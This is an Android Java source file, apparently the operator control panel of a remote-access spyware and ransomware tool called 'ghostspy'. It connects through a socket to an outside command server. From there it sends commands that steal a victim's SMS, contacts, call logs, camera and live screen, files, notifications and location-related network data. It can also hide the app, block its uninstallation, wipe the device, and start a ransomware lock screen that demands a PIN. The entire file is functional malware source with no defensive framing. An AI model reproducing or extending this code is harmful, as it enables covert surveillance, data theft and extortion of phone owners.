package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.AlphaAnimation;
import android.view.animation.ScaleAnimation;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");
        String model = getIntent().getStringExtra("deviceModel");
        String battery = getIntent().getStringExtra("battery");

        // Root dengan ScrollView
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);

        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(0, 0, 0, 32);

        // ===== HEADER =====
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF171717);
        header.setPadding(16, 12, 16, 12);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView info = new TextView(this);
        info.setText(model + " | Bat: " + battery + "%");
        info.setTextColor(0xFFFFFFFF);
        info.setPadding(12, 6, 12, 6);
        info.setBackgroundColor(0xFF171717);
        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        info.setLayoutParams(infoParams);
        info.setGravity(Gravity.CENTER);
        header.addView(info);

        TextView notif = new TextView(this);
        notif.setText("2");
        notif.setTextColor(0xFFFFFFFF);
        notif.setBackground(getDrawable(R.drawable.btn_admin));
        notif.setPadding(10, 4, 10, 4);
        header.addView(notif);
        content.addView(header);

        // ===== LOCK / UNLOCK =====
        LinearLayout lockPanel = new LinearLayout(this);
        lockPanel.setOrientation(LinearLayout.HORIZONTAL);
        lockPanel.setGravity(Gravity.CENTER);
        lockPanel.setPadding(12, 10, 12, 6);

        Button lockBtn = createActionBtn("Lock", "#FF1744");
        lockBtn.setOnClickListener(v -> showLockScreenDialog());
        lockPanel.addView(lockBtn);

        Button unlockBtn = createActionBtn("Unlock", "#00E676");
        unlockBtn.setOnClickListener(v -> sendCmd("unlock"));
        lockPanel.addView(unlockBtn);
        content.addView(lockPanel);

        // ===== TOOLS =====
        LinearLayout toolsPanel = new LinearLayout(this);
        toolsPanel.setOrientation(LinearLayout.HORIZONTAL);
        toolsPanel.setGravity(Gravity.CENTER);
        toolsPanel.setPadding(12, 4, 12, 8);

        Button antiBtn = createToolBtn("Anti‑Uninstall", "#2196F3", v -> showAntiUninstallDialog());
        toolsPanel.addView(antiBtn);

        Button renameBtn = createToolBtn("Rename", "#9C27B0", v -> showRenameDialog());
        toolsPanel.addView(renameBtn);

        Button iconBtn = createToolBtn("Icon", "#FF9800", v -> showChangeIconDialog());
        toolsPanel.addView(iconBtn);

        Button payloadBtn = createToolBtn("Payload", "#00BCD4", v -> showPayloadDialog());
        toolsPanel.addView(payloadBtn);
        content.addView(toolsPanel);

        // ===== GRID 3 KOLOM =====
        LinearLayout grid = new LinearLayout(this);
        grid.setOrientation(LinearLayout.VERTICAL);
        grid.setPadding(12, 8, 12, 12);

        // Data: label, warna, command
        String[][] items = {
            {"Camera", "#FF1744", "start_camera"},
            {"SMS", "#FF4D8D", "get_sms"},
            {"Contacts", "#00E676", "get_contacts"},
            {"Call", "#FFC107", "get_calls"},
            {"Live Screen", "#2ED8FF", "live_screen"},
            {"Apps", "#2196F3", "get_apps"},
            {"Network", "#9C27B0", "get_network"},
            {"Notify", "#FF9800", "get_notifications"},
            {"WiFi Scan", "#00BCD4", "wifiscan"},
            {"Files", "#FF5722", "list_files"},
            {"Cell Tower", "#607D8B", "celltower"},
            {"WiFi Hist", "#3F51B5", "wifihistory"}
        };

        LinearLayout row = null;
        for (int i = 0; i < items.length; i++) {
            if (i % 3 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                grid.addView(row);
            }
            row.addView(createGridCard(items[i][0], items[i][1], items[i][2]));
        }
        content.addView(grid);

        // ===== CONTROL CENTER =====
        TextView controlCenter = new TextView(this);
        controlCenter.setText("Control Center");
        controlCenter.setTextColor(0xFFFFFFFF);
        controlCenter.setBackground(getDrawable(R.drawable.card_admin));
        controlCenter.setPadding(16, 12, 16, 12);
        controlCenter.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams ccParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        ccParams.setMargins(16, 0, 16, 0);
        controlCenter.setLayoutParams(ccParams);
        controlCenter.setOnClickListener(v -> showControlPopup());
        content.addView(controlCenter);

        scroll.addView(content);
        root.addView(scroll);
        setContentView(root);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}
    }

    // ===== HELPER BUTTONS =====
    private Button createActionBtn(String text, String color) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
        btn.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 52, 1);
        p.setMargins(4, 0, 4, 0);
        btn.setLayoutParams(p);
        return btn;
    }

    private Button createToolBtn(String text, String color, android.view.View.OnClickListener listener) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
        btn.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 44, 1);
        p.setMargins(3, 0, 3, 0);
        btn.setLayoutParams(p);
        btn.setOnClickListener(listener);
        return btn;
    }

    private LinearLayout createGridCard(String label, String color, String cmd) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER);
        card.setBackgroundColor((int) Long.parseLong(color.substring(1), 16) | 0x22000000);
        card.setPadding(4, 14, 4, 14);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 110, 1);
        p.setMargins(4, 4, 4, 4);
        card.setLayoutParams(p);

        // Ikon sederhana (bukan stiker)
        TextView icon = new TextView(this);
        icon.setText(getIconForCmd(cmd));
        icon.setTextColor(0xFFFFFFFF);
        icon.setTextSize(18);
        icon.setGravity(Gravity.CENTER);

        TextView lbl = new TextView(this);
        lbl.setText(label);
        lbl.setTextColor(0xFFCCCCCC);
        lbl.setTextSize(10);
        lbl.setGravity(Gravity.CENTER);
        lbl.setPadding(0, 4, 0, 0);

        card.addView(icon);
        card.addView(lbl);

        card.setOnClickListener(v -> {
            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
            scale.setDuration(120);
            scale.setRepeatCount(0);
            v.startAnimation(scale);
            handleAction(cmd);
        });
        return card;
    }

    private String getIconForCmd(String cmd) {
        switch (cmd) {
            case "start_camera": return "📷";
            case "get_sms": return "💬";
            case "get_contacts": return "👥";
            case "get_calls": return "📞";
            case "live_screen": return "🖥";
            case "get_apps": return "📦";
            case "get_network": return "🌐";
            case "get_notifications": return "🔔";
            case "wifiscan": return "📶";
            case "list_files": return "📁";
            case "celltower": return "📡";
            case "wifihistory": return "🕒";
            default: return "•";
        }
    }

    // ===== DIALOGS =====
    private void showAntiUninstallDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("Anti‑Uninstall");
        CheckBox toggle = new CheckBox(this);
        toggle.setText("Aktifkan");
        toggle.setTextColor(0xFFFFFFFF);
        toggle.setChecked(true);
        b.setView(toggle);
        b.setPositiveButton("Terapkan", (d, w) -> {
            try { sendCmd("anti_uninstall", new JSONObject().put("state", toggle.isChecked())); } catch (Exception e) {}
        });
        b.setNegativeButton("Batal", null);
        b.show();
    }

    private void showRenameDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("Rename APK");
        EditText input = new EditText(this);
        input.setHint("Nama baru");
        input.setTextColor(0xFFFFFFFF);
        input.setBackgroundColor(0xFF252525);
        b.setView(input);
        b.setPositiveButton("Ubah", (d, w) -> {
            String name = input.getText().toString().trim();
            if (!name.isEmpty()) {
                try { sendCmd("rename_app", new JSONObject().put("newName", name)); } catch (Exception e) {}
            }
        });
        b.setNegativeButton("Batal", null);
        b.show();
    }

    private void showChangeIconDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("Ganti Ikon");
        EditText input = new EditText(this);
        input.setHint("URL gambar");
        input.setTextColor(0xFFFFFFFF);
        input.setBackgroundColor(0xFF252525);
        b.setView(input);
        b.setPositiveButton("Ganti", (d, w) -> {
            String url = input.getText().toString().trim();
            if (!url.isEmpty()) {
                try { sendCmd("change_icon", new JSONObject().put("url", url)); } catch (Exception e) {}
            }
        });
        b.setNegativeButton("Batal", null);
        b.show();
    }

    private void showPayloadDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("Payload");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.HORIZONTAL);
        lay.setGravity(Gravity.CENTER);
        lay.setPadding(16, 16, 16, 16);

        Button hide = new Button(this);
        hide.setText("Hide");
        hide.setTextColor(0xFFFFFFFF);
        hide.setBackgroundColor(0xFFFF1744);
        hide.setOnClickListener(v -> sendCmd("hide_app"));
        lay.addView(hide);

        Button unhide = new Button(this);
        unhide.setText("Unhide");
        unhide.setTextColor(0xFFFFFFFF);
        unhide.setBackgroundColor(0xFF00E676);
        unhide.setOnClickListener(v -> sendCmd("unhide_app"));
        lay.addView(unhide);

        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void showLockScreenDialog() {
        Dialog dialog = new Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);

        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setBackground(getDrawable(R.drawable.card_admin));
        container.setPadding(24, 24, 24, 24);
        int margin = 32;
        LinearLayout.LayoutParams rootParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        rootParams.setMargins(margin, margin*2, margin, margin*2);
        container.setLayoutParams(rootParams);

        TextView title = new TextView(this);
        title.setText("Custom Lock Screen");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(20);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setPadding(0, 0, 0, 16);
        container.addView(title);

        EditText htmlEditor = new EditText(this);
        htmlEditor.setHint("<h1>HP TERKUNCI</h1>");
        htmlEditor.setTextColor(0xFFFFFFFF);
        htmlEditor.setBackgroundColor(0xFF252525);
        htmlEditor.setPadding(16, 12, 16, 12);
        htmlEditor.setMinLines(5);
        htmlEditor.setGravity(Gravity.TOP);
        container.addView(htmlEditor);

        WebView preview = new WebView(this);
        preview.setWebViewClient(new WebViewClient());
        preview.getSettings().setJavaScriptEnabled(false);
        preview.setBackgroundColor(0xFF000000);
        LinearLayout.LayoutParams webParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 220);
        webParams.setMargins(0, 8, 0, 12);
        preview.setLayoutParams(webParams);
        container.addView(preview);

        htmlEditor.addTextChangedListener(new android.text.TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override public void afterTextChanged(android.text.Editable s) {
                preview.loadDataWithBaseURL(null, s.toString(), "text/html", "UTF-8", null);
            }
        });

        EditText pinInput = new EditText(this);
        pinInput.setHint("PIN (4-6 digit)");
        pinInput.setTextColor(0xFFFFFFFF);
        pinInput.setBackgroundColor(0xFF252525);
        pinInput.setPadding(16, 12, 16, 12);
        pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        container.addView(pinInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);
        btnRow.setPadding(0, 16, 0, 0);

        Button jalankanBtn = new Button(this);
        jalankanBtn.setText("Jalankan");
        jalankanBtn.setTextColor(0xFFFFFFFF);
        jalankanBtn.setBackgroundColor(0xFF00E676);
        jalankanBtn.setOnClickListener(v -> {
            String html = htmlEditor.getText().toString().trim();
            String pin = pinInput.getText().toString().trim();
            if (html.isEmpty() || pin.isEmpty()) {
                Toast.makeText(this, "HTML & PIN harus diisi", Toast.LENGTH_SHORT).show();
                return;
            }
            try {
                sendCmd("ransomware_activate", new JSONObject().put("html", html).put("pin", pin));
            } catch (Exception e) {}
            dialog.dismiss();
        });
        btnRow.addView(jalankanBtn);

        Button matikanBtn = new Button(this);
        matikanBtn.setText("Matikan");
        matikanBtn.setTextColor(0xFFFFFFFF);
        matikanBtn.setBackgroundColor(0xFFFF1744);
        matikanBtn.setOnClickListener(v -> {
            sendCmd("ransomware_deactivate");
            dialog.dismiss();
        });
        btnRow.addView(matikanBtn);

        container.addView(btnRow);

        Button tutupBtn = new Button(this);
        tutupBtn.setText("Tutup");
        tutupBtn.setTextColor(0xFF9AA3B2);
        tutupBtn.setBackgroundColor(0x00000000);
        tutupBtn.setOnClickListener(v -> dialog.dismiss());
        container.addView(tutupBtn);

        dialog.setContentView(container);
        dialog.show();

        AlphaAnimation fadeIn = new AlphaAnimation(0f, 1f);
        fadeIn.setDuration(250);
        container.startAnimation(fadeIn);
    }

    private void handleAction(String cmd) {
        Intent i = null;
        switch (cmd) {
            case "start_camera": i = new Intent(this, CameraActivity.class); break;
            case "get_sms": i = new Intent(this, SmsActivity.class); break;
            case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
            case "get_calls": i = new Intent(this, CallActivity.class); break;
            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
        }
        if (i != null) {
            i.putExtra("deviceId", deviceId);
            startActivity(i);
        } else {
            sendCmd(cmd);
        }
    }

    private void showControlPopup() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("Control Center");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        String[] cmds = {"flashlight", "vibrate", "lock", "unlock", "toast", "openurl", "wipe"};
        for (String cmd : cmds) {
            Button btn = new Button(this);
            btn.setText(cmd);
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0xFF171717);
            btn.setOnClickListener(v -> sendCmd(cmd));
            lay.addView(btn);
        }
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "Ok " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "Offline", Toast.LENGTH_SHORT).show();
        }
    }
}
